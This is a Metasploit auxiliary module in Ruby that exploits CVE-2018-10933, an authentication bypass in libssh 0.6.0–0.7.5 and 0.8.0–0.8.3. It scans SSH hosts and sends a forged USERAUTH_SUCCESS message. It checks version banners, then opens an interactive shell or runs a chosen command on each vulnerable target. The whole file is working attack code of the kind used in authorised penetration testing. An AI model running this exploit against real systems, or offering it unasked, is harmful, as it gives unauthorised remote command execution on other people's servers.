##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::SSH
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::CommandShell
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'libssh Authentication Bypass Scanner',
      'Description'    => %q{
        This module exploits an authentication bypass in libssh server code
        where a USERAUTH_SUCCESS message is sent in place of the expected
        USERAUTH_REQUEST message. libssh versions 0.6.0 through 0.7.5 and
        0.8.0 through 0.8.3 are vulnerable.

        Note that this module's success depends on whether the server code
        can trigger the correct (shell/exec) callbacks despite only the state
        machine's authenticated state being set.

        Therefore, you may or may not get a shell if the server requires
        additional code paths to be followed.
      },
      'Author'         => [
        'Peter Winter-Smith', # Discovery
        'wvu'                 # Module
      ],
      'References'     => [
        ['CVE', '2018-10933'],
        ['URL', 'https://www.libssh.org/security/advisories/CVE-2018-10933.txt']
      ],
      'DisclosureDate' => 'Oct 16 2018',
      'License'        => MSF_LICENSE,
      'Actions'        => [
        ['Shell',   'Description' => 'Spawn a shell'],
        ['Execute', 'Description' => 'Execute a command']
      ],
      'DefaultAction'  => 'Shell'
    ))

    register_options([
      Opt::RPORT(22),
      OptString.new('CMD',        [false, 'Command or alternative shell']),
      OptBool.new('SPAWN_PTY',    [false, 'Spawn a PTY', false]),
      OptBool.new('CHECK_BANNER', [false, 'Check banner for libssh', true])
    ])

    register_advanced_options([
      OptBool.new('SSH_DEBUG',  [false, 'SSH debugging', false]),
      OptInt.new('SSH_TIMEOUT', [false, 'SSH timeout', 10])
    ])
  end

  # Vulnerable since 0.6.0 and patched in 0.7.6 and 0.8.4
  def check_banner(ip, version)
    version =~ /libssh_([\d.]+)$/ && $1 && (v = Gem::Version.new($1))

    if v.nil?
      vprint_error("#{ip}:#{rport} - #{version} does not appear to be libssh")
      Exploit::CheckCode::Unknown
    elsif v.between?(Gem::Version.new('0.6.0'), Gem::Version.new('0.7.5')) ||
          v.between?(Gem::Version.new('0.8.0'), Gem::Version.new('0.8.3'))
      vprint_good("#{ip}:#{rport} - #{version} appears to be unpatched")
      Exploit::CheckCode::Appears
    else
      vprint_error("#{ip}:#{rport} - #{version} appears to be patched")
      Exploit::CheckCode::Safe
    end
  end

  def run_host(ip)
    if action.name == 'Execute' && datastore['CMD'].blank?
      print_error('CMD is required to be set for the Execute action')
      return
    end

    factory = ssh_socket_factory

    ssh_opts = {
      port:            rport,
      # The auth method is converted into a class name for instantiation,
      # so libssh-auth-bypass here becomes LibsshAuthBypass from the mixin
      auth_methods:    ['libssh-auth-bypass'],
      non_interactive: true,
      config:          false,
      use_agent:       false,
      verify_host_key: :never,
      proxy:           factory
    }

    ssh_opts.merge!(verbose: :debug) if datastore['SSH_DEBUG']

    print_status("#{ip}:#{rport} - Attempting authentication bypass")

    begin
      ssh = Timeout.timeout(datastore['SSH_TIMEOUT']) do
        Net::SSH.start(ip, username, ssh_opts)
      end
    rescue Net::SSH::Exception => e
      vprint_error("#{ip}:#{rport} - #{e.class}: #{e.message}")
      return
    end

    return unless ssh

    version = ssh.transport.server_version.version

    # XXX: The OOB authentication leads to false positives, so check banner
    return if datastore['CHECK_BANNER'] &&
              check_banner(ip, version) != Exploit::CheckCode::Appears

    report_vuln(
      host: ip,
      name: self.name,
      refs: self.references,
      info: version
    )

    shell = Net::SSH::CommandStream.new(ssh, *config)

    # XXX: Wait for CommandStream to log a channel request failure
    sleep 0.1

    if shell.error
      print_error("#{ip}:#{rport} - #{shell.error}")
      return
    end

    case action.name
    when 'Shell'
      start_session(self, "#{self.name} (#{version})", {}, false, shell.lsock)
    when 'Execute'
      output = shell.channel[:data].chomp

      if output.blank?
        print_error("Empty or blank output: #{datastore['CMD']}")
        return
      end

      print_status("#{ip}:#{rport} - Executed: #{datastore['CMD']}\n#{output}")
    end
  end

  def rport
    datastore['RPORT']
  end

  def username
    Rex::Text.rand_text_alphanumeric(8..42)
  end

  def config
    [
      datastore['CMD'],
      pty: datastore['SPAWN_PTY']
    ]
  end

end
